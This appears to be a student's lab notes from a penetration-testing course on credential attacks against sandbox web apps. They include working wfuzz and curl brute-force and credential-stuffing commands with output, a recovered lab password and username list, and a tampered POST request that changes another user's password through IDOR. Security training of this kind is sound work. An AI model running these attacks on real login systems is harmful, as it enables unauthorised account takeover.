## Credential Attacks

1.    Understand what a credential set is
2.    Understand the components of a credential attack
3.    Understand the basics of a credential attack
4.    Understand how to conduct credential attacks

In its most basic form, a credential set is a pair of username and password values.

	guest:guestPassword
	
## Tools to know

	1.	Wfuzz 		[used for brute forcing/credential stuffing]
	2.	SecLists 	[collection of wordlists, payloads, and fuzzing strings used for testing Web Applications]
	3.	Burp Suite 	[used to analyze login form submissions for GET and POST data]
	
## Default Credentials
When we perform an engagement and come across a team making use of a third-party application, we want to make sure that we 	check for default credentials as one of the first tests.

In the example, the site is running phpMyAdmin, a Google search reveals it uses the default creds "root:password". 
	
This allowed us to login with no issue

## Common Password Patterns and Complexity
	
When assessing a web application's login form or the account creation process, we should also be familiar with complex and proper password policies. If we can create an account with a weak password such as "examplepass", we then know by definition that the target permits ineffective password policies.

As attackers, we want to check for both minimum and maximum password complexity schemes.

	Minimum Complexity Password:
	- No strict rules on password complexity.
	bluecar
	
	Low Complexity Password:
	- Uppercase, Lowecase, Numeric.
	BlueCar189
	
	Moderate Complexity Password:
	- Uppercase, Lowecase, Numeric, Special Characters.
	BlueCar1^8!9
	
	High Complexity Password:
	- Uppercase, Lowercase, Numeric, Special Characters, Mixed.
	Blu3Car0lina$*@
	
	Maximum Complexity Password (64 character limit of modern hashing algorithms):
	- Uppercase, Lowercase, Numeric, Special Character, Mixed, 64 character length.
	Blu3Car0lina$*@29dywkasd!hs^uakaboahd&&de83!bdh9%h2m3jf8aj38j&d

Password themes can be used to brute forced due to popularity

	Theme: (Season +  Digit)
	Spring22
	Summer22
	Fall22
	Winter22
	
	Theme: (Season +  Digit + Special Character)
	Spring22!
	Summer22!
	Fall22!
	Winter22!
	
	Theme: (Color +  Digit)
	Red42
	Blue42
	Green42
	Purple42
	Orange42
	
	Theme: (Color +  Digit + Special Character)
	Red42!
	Blue42!
	Green42!
	Purple42!
	Orange42!

Section Links:
	- [Brute Force Attack, OWASP](https://owasp.org/www-community/attacks/Brute_force_attack)
	- [Authentication Cheat Sheet Password Strength Controls, OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html#implement-proper-password-strength-controls)
	- [Authentication Cheat Sheet, OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)

## Credential Reuse

In this section, we will be dealing with a vulnerability known as Credential Reuse. When credential reuse behavior is discovered, it implies that credentials of one application or network service were reused on another application or network service. In many cases, credential reuse can lead to successful credential stuffing attacks.

In the example, they take a user Koby, and reuse the password "password" to gain access to the second web application

[Credential Stuffing, OWASP](https://owasp.org/www-community/attacks/Credential_stuffing#:~:text=Credential%20stuffing%20is%20the%20automated,gain%20access%20to%20user%20accounts.)

## Rate Limits and Lockouts

### Rate Limiting

The concept of a rate limit is to curb the amount of network traffic for an endpoint at any given time. This could be implemented on the index page to prevent denial of service attacks, or a login form to prevent brute forcing and credential stuffing attacks.

For the example, we go to the rate limiting page and notice a prolonged load-time, by running the following command, we can see how long it takes to perform a request on the target endpoint

	time curl -I http://ca-sandbox/rate-limiting/login
	HTTP/1.1 200 OK
	Date: Wed, 03 Aug 2022 15:52:14 GMT
	Server: Apache/2.4.38 (Debian)
	X-Powered-By: PHP/7.2.34
	Set-Cookie: PHPSESSID=3be003e0cc4bc08362ac79d3be1bf24b; path=/
	Expires: Thu, 19 Nov 1981 08:52:00 GMT
	Cache-Control: no-store, no-cache, must-revalidate
	Pragma: no-cache
	Content-Type: text/html; charset=UTF-8
	
	real	0m9.561s
	user	0m0.003s
	sys	    0m0.015s

Due to the 10s response time, attempting brute force or credential stuffing here would take a century (hyperbole)

Section Links:
	- [What is Rate Limiting, Cloudflare](https://www.cloudflare.com/learning/bots/what-is-rate-limiting/)

### Account Lockout

As the name suggests, it will often prevent the user's IP address from performing any more sign-on attempts after a limit has been reached. This lockout effect is application specific and can be variable. It should also be noted that with forms that enforce account lockouts on failed attempts, **we have a prime target for a credential stuffing attack**. This type of attack will be covered later in this Module.

## Insecure CAPTCHAs

A CAPTCHA will always attempt to stand in our way when attacking web forms. Therefore, we must be aware of how to bypass any weak CAPTCHA implementations that we might encounter in the real world. More specifically, in this section we will discuss poor implementations of CAPTCHAs that re-use values.

As defined by Merriam Webster, a Completely Automated Public Turing test to tell Computers and Humans Apart (CAPTCHA) is:
	
	*A test to prevent spamming software from accessing a website by requiring visitors to the site to solve a simple puzzle (typically by reading and transcribing a series of numbers or letters from a distorted image) in order to gain access".*

## CAPTCHA Re-Use

The idea behind our attack in this section is relatively straightforward. We're going to enumerate at least one CAPTCHA value that we note to be repeated due to poor implementation. Then, we'll send along a login request with an authentic CAPTCHA value. Eventually, after enough requests and because the CAPTCHA value is re-used, our attack will succeed.

## CAPTCHA in Source

One of the weakest forms of CAPTCHA implementation is when the page includes all the information needed to answer the CAPTCHA. Right Click > Inspect Element and note whether or not this CAPTCHA information is provided in the source code.

## Brute Forcing

Brute Forcing is one of the most common attacks in penetration testing. It provides a powerful way to gain access to accounts when we do not have compromised credentials to work with. The idea is that we want to perform many requests against a single target user and examine the output for any potential success.

For the practice we use bruteUser and bogusPassword for the login page while running intercept on burpsuite. This gives us the endpoint we are brute forcing and the POST data.

	POST /brute-forcing/login/index.php HTTP/1.1
	username=bruteUser&password=bogusPassword

Next we'll use curl to determine what a failed response provides in character bytes

	curl -so /dev/null -d "username=bruteUser&password=bogusPassword" -X POST http://ca-sandbox:80/brute-forcing/login/ -w '%{size_download}'
	8324

This tells us a failed output is 8324 bytes and we can use wfuzz with the -hh (hush) option to ignore return byte-size values of 8324

	wfuzz -c -z file,/usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt -d "username=bruteUser&password=FUZZ" --hh 8324 http://CA-Sandbox:80/brute-forcing/login/
	
	********************************************************
	* Wfuzz 3.1.0 - The Web Fuzzer                         *
	********************************************************
	
	Target: http://CA-Sandbox:80/brute-forcing/login/
	Total requests: 10000
	
	=====================================================================
	ID           Response   Lines    Word       Chars       Payload
	=====================================================================
	000009533:   200        299 L    669 W      8592 Ch     "1234567890-"
	
	Total time: 0
	Processed Requests: 10000
	Filtered Requests: 9999
	Requests/sec.: 0
> sudo apt install seclists

Running the command outputs the above where the payload is equal to the password for the user, this allows us to log in. Once in the system we can collect user accounts, a credential in plaintext, and save it all for future use.
	developer:jd983hs91aa
	Users:
		root
		frieda
		brandon
		royale
		alyx
		tottie
		julianna
		calin
		aveline
		kody
		robin
		brittney
		julius
		buck
		catharine
		starr
		joanie
		david
		greg
		kaleb
	
[Brute Forcing, OWASP](https://owasp.org/www-community/attacks/Brute_force_attack)

## Credential Stuffing

Credential stuffing is the opposite of brute force but maintains a similarity. Instead of throwing a bunch of passwords at one user, we'll throw a bunch of users at one password. In this case we have the password found during the brute force, and using a similar wfuzz command, we will attempt to find the user it belongs to by creating our own wordlist of users, and then plugging that into wfuzz.

	kali@kali:~$ wfuzz -c -z file,./credstuff_wordlist.txt -d "username=FUZZ&password=jd983hs91aa" --hh 8342 http://CA-Sandbox:80/credential-stuffing/login/

	********************************************************
	* Wfuzz 3.1.0 - The Web Fuzzer                         *
	********************************************************
	
	Target: http://CA-Sandbox:80/credential-stuffing/login/
	Total requests: 20
	
	=====================================================================
	ID           Response   Lines    Word       Chars       Payload
	=====================================================================
	
	000000020:   200        299 L    669 W      8622 Ch     "kaleb"
	
	Total time: 0.094734
	Processed Requests: 20
	Filtered Requests: 19
	Requests/sec.: 211.1164

## Password Change Attacks with IDOR

The premise behind a password change attack is to change the password of an account that is not our own. This can often be done by intercepting the POST data of a password change form and manipulating it so that we end up changing another user's password. Because we are attempting to modify an object in the request submission, this type of attack would technically fall into the category of Insecure Direct Object Referencing (IDOR).

For this, we login as a regular user and go to change out password, upon doing so we want to turn on intercept in burp so we can capture the POST request.

	POST /change-attacks/profile/ HTTP/1.1
	currentPass=attacker&newPass=offsec&currentUser=attacker%40thinc.local (%40 is the @ symbol)

With this, we can modify the POST request to any user in the prefix of the email and any password

	currentPass=attacker&newPass=offsecwuzhere&currentUser=robin%40thinc.local

## Case Study

Learning to use Intruder with BurpSuite in an attempt to brute force koel

Starting I navigate to http://koel and take note of the login page and attempt a random login with bruteUserExercise@thinc.local and password of bogusPassword. I simply enter it with nothing fancy then go back to burp and review http history to see the request. Upon viewing them, there is one that contains the email and password I used at login, I send these to intruder by right-clicking it.

Once in intruder, I will add in the payload positions modifying the original request from this:

	{"email":"bruteUserExercise@thinc.local","password":"bogusPassword"}

To this:

	{"email":"bruteUserExercise@thinc.local","password":"§§"}

> The §§ denote the position of the payload

After this, I will load the seclists wordlist top 100 into the payloads section on the right and start attack. 

Once the attack begins, I am looking for a 200 response code which will let me know there was a successful attempt.

